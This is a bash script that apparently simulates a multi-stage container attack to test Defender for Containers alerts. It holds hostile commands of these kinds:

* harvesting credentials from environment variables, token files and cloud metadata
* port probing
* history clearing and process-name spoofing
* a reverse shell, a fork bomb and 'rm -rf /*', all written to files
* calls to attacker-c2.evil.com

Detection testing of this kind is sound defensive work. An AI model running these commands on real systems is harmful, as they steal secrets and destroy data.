#!/bin/bash

# Advanced Persistent Threat (APT) Simulation
# Copyright (c) Microsoft Corporation.
# Licensed under the MIT License.

echo "=== ADVANCED PERSISTENT THREAT SIMULATION ==="
echo "Simulating sophisticated multi-stage attack..."
echo ""

# Stage 1: Initial Reconnaissance
echo "🎯 STAGE 1: INITIAL RECONNAISSANCE"
echo "Gathering environmental intelligence..."

echo "System Information:"
uname -a
cat /etc/os-release 2>/dev/null | head -5

echo ""
echo "Container Runtime Detection:"
if [ -f /.dockerenv ]; then
    echo "✓ Docker container detected"
elif [ -f /run/.containerenv ]; then
    echo "✓ Podman container detected"
else
    echo "✓ Containerized environment detected"
fi

echo ""
echo "Network Reconnaissance:"
hostname -I 2>/dev/null | head -1
ip route 2>/dev/null | grep default

echo ""
echo "Process Enumeration:"
ps aux 2>/dev/null | head -10 || ps | head -10

# Stage 2: Credential Harvesting
echo ""
echo "🔐 STAGE 2: CREDENTIAL HARVESTING"
echo "Searching for credentials and secrets..."

echo "Environment Variables Scan:"
env | grep -i -E "(password|secret|key|token|api)" | head -10 || echo "No obvious secrets in environment"

echo ""
echo "File System Credential Search:"
find /home /tmp /var -name "*.key" -o -name "*.pem" -o -name "*password*" -o -name "*secret*" 2>/dev/null | head -10 || echo "No credential files found"

echo ""
echo "Kubernetes Secrets:"
if [ -d /var/run/secrets/kubernetes.io/serviceaccount ]; then
    echo "✓ Kubernetes service account found"
    echo "Namespace: $(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)"
    echo "Token: $(head -c 30 /var/run/secrets/kubernetes.io/serviceaccount/token)..."
fi

echo ""
echo "Cloud Provider Metadata:"
curl -s -m 3 http://169.254.169.254/metadata/identity/oauth2/token 2>/dev/null && echo "Azure metadata accessible" || echo "No cloud metadata access"

# Stage 3: Lateral Movement
echo ""
echo "🔄 STAGE 3: LATERAL MOVEMENT"
echo "Attempting to move laterally through the environment..."

echo "Network Scanning:"
if command -v nmap >/dev/null 2>&1; then
    echo "Running network scan..."
    nmap -sn 169.254.169.254 2>/dev/null || echo "Network scan failed"
else
    echo "Nmap not available, using manual probing..."
    ping -c 1 169.254.169.254 >/dev/null 2>&1 && echo "Metadata service reachable" || echo "No metadata service"
fi

echo ""
echo "Service Discovery:"
if command -v kubectl >/dev/null 2>&1; then
    echo "kubectl available - attempting cluster enumeration..."
    kubectl get pods --all-namespaces 2>/dev/null | head -5 || echo "kubectl access denied"
fi

echo ""
echo "Internal Network Probing:"
for port in 22 80 443 8080 6443; do
    timeout 2 bash -c "</dev/tcp/kubernetes.default/$port" 2>/dev/null && echo "Port $port open on kubernetes.default" || echo "Port $port closed/filtered"
done

# Stage 4: Persistence
echo ""
echo "💾 STAGE 4: PERSISTENCE ESTABLISHMENT"
echo "Attempting to establish persistence..."

echo "Cron Jobs:"
echo "*/5 * * * * /tmp/persistent_backdoor.sh" > /tmp/fake_cron
echo "Simulated crontab entry created: /tmp/fake_cron"

echo ""
echo "Startup Scripts:"
echo '#!/bin/bash\necho "Persistent backdoor activated" >> /tmp/backdoor.log' > /tmp/fake_startup.sh
chmod +x /tmp/fake_startup.sh
echo "Simulated startup script: /tmp/fake_startup.sh"

echo ""
echo "Environment Hijacking:"
echo 'alias ls="ls && /tmp/backdoor.sh"' > /tmp/fake_bashrc
echo "Simulated shell hijack: /tmp/fake_bashrc"

# Stage 5: Data Exfiltration
echo ""
echo "📤 STAGE 5: DATA EXFILTRATION"
echo "Simulating data collection and exfiltration..."

echo "Sensitive File Discovery:"
find / -name "*.conf" -o -name "*.cfg" -o -name "*.yaml" -o -name "*.json" 2>/dev/null | grep -E "(kube|docker|config)" | head -10

echo ""
echo "Log File Analysis:"
find /var/log -name "*.log" 2>/dev/null | head -5

echo ""
echo "Memory Dump Simulation:"
echo "Simulating memory dump for credential extraction..."
if [ -d /proc ]; then
    echo "Process memory maps accessible via /proc filesystem"
    ls /proc/*/maps 2>/dev/null | head -3
fi

echo ""
echo "Database Connection Attempts:"
for db_port in 3306 5432 1433 27017; do
    timeout 1 bash -c "</dev/tcp/localhost/$db_port" 2>/dev/null && echo "Database port $db_port accessible" || echo "Database port $db_port not accessible"
done

# Stage 6: Command and Control
echo ""
echo "📡 STAGE 6: COMMAND AND CONTROL"
echo "Establishing C2 communication..."

echo "DNS Tunneling Simulation:"
nslookup attacker-c2.evil.com 2>/dev/null || echo "DNS lookup failed (expected)"

echo ""
echo "HTTP C2 Simulation:"
curl -s -m 3 "http://attacker-c2.evil.com/checkin" 2>/dev/null || echo "HTTP C2 connection failed (expected)"

echo ""
echo "Reverse Shell Simulation:"
echo "nc -e /bin/bash attacker-c2.evil.com 4444" > /tmp/fake_reverse_shell.sh
echo "Simulated reverse shell script: /tmp/fake_reverse_shell.sh"

# Stage 7: Covering Tracks
echo ""
echo "🧹 STAGE 7: COVERING TRACKS"
echo "Attempting to cover attack traces..."

echo "Log Clearing Simulation:"
echo "Attempting to clear system logs..."
if [ -w /var/log ]; then
    echo "Log directory writable - could clear evidence"
else
    echo "Log directory not writable"
fi

echo ""
echo "History Manipulation:"
echo "Clearing command history..."
unset HISTFILE
export HISTSIZE=0
echo "History clearing simulated"

echo ""
echo "Timestamp Manipulation:"
touch -t 202301010000 /tmp/fake_file.txt
echo "File timestamp manipulation demonstrated"

echo ""
echo "Process Hiding:"
echo "Attempting process name manipulation..."
cp /bin/sleep /tmp/[kworker/0:1]
echo "Process name spoofing simulated"

# Stage 8: Impact Assessment
echo ""
echo "💥 STAGE 8: IMPACT ASSESSMENT"
echo "Demonstrating potential attack impact..."

echo "Resource Exhaustion:"
echo "Simulating resource consumption attack..."
# Don't actually consume resources, just demonstrate
echo "fork(){ fork|fork& };fork" > /tmp/fake_fork_bomb.sh
echo "Fork bomb simulation script created"

echo ""
echo "Data Destruction Simulation:"
echo "rm -rf /*" > /tmp/fake_destruction.sh
echo "Data destruction script simulated (NOT EXECUTED)"

echo ""
echo "Service Disruption:"
echo "killall -9 nginx php-fpm" > /tmp/fake_service_kill.sh
echo "Service disruption script simulated"

echo ""
echo "=== APT SIMULATION SUMMARY ==="
echo "This advanced simulation demonstrated:"
echo ""
echo "Stage 1: Initial reconnaissance and environment mapping"
echo "Stage 2: Credential harvesting from multiple sources"
echo "Stage 3: Lateral movement within the environment"
echo "Stage 4: Persistence mechanism establishment"
echo "Stage 5: Data discovery and exfiltration preparation"
echo "Stage 6: Command and control communication setup"
echo "Stage 7: Evidence covering and stealth techniques"
echo "Stage 8: Potential impact and damage assessment"
echo ""
echo "🔥 This represents a sophisticated, multi-stage attack"
echo "🔥 Real APT groups use similar techniques over weeks/months"
echo "🔥 Detection requires behavioral analysis and correlation"
echo ""
echo "Expected Defender for Containers alerts:"
echo "- Multiple suspicious process executions"
echo "- Network scanning activity"
echo "- Sensitive file access"
echo "- Unusual network connections"
echo "- Process manipulation"
echo "- Resource abuse indicators"
echo ""
echo "=== APT SIMULATION COMPLETED ==="